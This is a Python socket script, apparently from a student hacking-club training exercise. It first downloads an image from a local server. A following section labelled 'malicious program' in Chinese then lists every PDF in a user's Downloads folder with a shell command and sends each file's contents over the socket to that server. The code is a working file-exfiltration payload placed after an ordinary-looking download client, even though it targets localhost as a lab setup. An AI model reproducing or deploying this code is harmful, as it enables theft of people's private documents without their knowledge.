#!/usr/bin/env python
# -*-coding:utf-8 -*-
import struct, json
import socket, threading, os
from time import sleep
# client下載檔案位置
download_dir = r'D:\_icando\iwantto\駭客\駭客組寒訓 2020.02.26\socket_兩方攻擊\server攻擊方\no attck'
gd_client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
gd_client.connect(('127.0.0.1',8123))
class one_send :
  # cmd=input('>>: 請輸入:get 檔名-->').strip() #get a.txt
  cmd = 'server攻.png'
  if not cmd:pass
  # send get server攻.png給server
  gd_client.send(cmd.encode('utf-8'))
  #2、以寫的方式開啟一個新檔案，接收服務端發來的檔案的內容寫入客戶的新檔案
  #第一步：先收報頭的長度
  obj=gd_client.recv(4)
  header_size=struct.unpack('i',obj)[0]
  # 第二步：再收報頭
  header_bytes = gd_client.recv(header_size)
  # 第三步：從報頭中解析出對真實資料的描述資訊
  header_json = header_bytes.decode('utf-8')
  header_dic = json.loads(header_json)
  '''
  header_dic = {
    'filename': filename, # 1.txt
    'file_size': os.path.getsize(r'%s\%s' % (share_dir, filename)) # 路徑/1.txt
  } 
  '''
  total_size = header_dic['file_size']
  file_name = header_dic['filename']
  # 第四步：接收真實的資料
  with open(r'%s\%s'%(download_dir, file_name),'wb') as f:
    recv_size = 0
    while recv_size < total_size:
      line = gd_client.recv(1024)
      f.write(line)
      recv_size += len(line)
      # print('===總大小：%s  已下載大小：%s' % (total_size, recv_size))
one_send()
gd_client.close()
#os.system("python ungood_program.py")
# -----------------------------惡意程式------------------------------------

download_dir = r'D:\_icando\iwantto\駭客\駭客組寒訓 2020.02.26\socket_兩方攻擊\server攻擊方\no attck'
gd_client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
gd_client.connect(('127.0.0.1',8123))
# 儲存pdf
get_data = os.system("C:&&cd C:/Users/hjom7356731/Downloads&&dir /b *.pdf > pdf_list.txt")
# print(get_data)

def send_file():
  file_list = open('C:/Users/hjom7356731/Downloads/pdf_list.txt', 'r')
  for i in file_list:
    file_name = i.rstrip('\n')
    with open('C:/Users/hjom7356731/Downloads/'+file_name, 'rb') as file:
      gd_client.send(file_name.encode())
      sleep(1)
      while True:
        data = file.read()
        # print(data)
        if data == bytes(''.encode()):
          gd_client.send('exit'.encode())
          sleep(1)
          break
        gd_client.send(data)
        sleep(1)

      print('File sent successfully.')






class one_send1 :
  cmd = 'hacker'
  if not cmd:pass
  gd_client.send(cmd.encode('utf-8'))
  send_file()
 
one_send1()
gd_client.close()
# os.system("python ungood_program.py")